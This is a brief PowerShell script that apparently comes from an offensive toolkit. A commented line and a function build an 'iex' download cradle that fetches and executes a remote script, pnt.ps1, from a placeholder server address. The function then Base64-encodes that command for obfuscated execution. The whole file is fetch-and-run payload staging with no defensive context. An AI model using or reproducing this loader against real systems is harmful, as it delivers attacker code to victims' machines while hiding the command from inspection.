#(cmd /c echo {IEX ((New-Object Net.WebClient).DownloadString('SERVER_IP_ADDRESS/ROOT_FOLDER/LINK_FOLDER/pnt.ps1'))}).split(' ')[1] |set-content .\zxd\o.txt
function zxd_generateEncoded {
	$Text = "iex((New-Object Net.WebClient).DownloadString('SERVER_IP_ADDRESS/ROOT_FOLDER/LINK_FOLDER/pnt.ps1'))"
	$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
	$EncodedText =[Convert]::ToBase64String($Bytes)
	$EncodedText
}



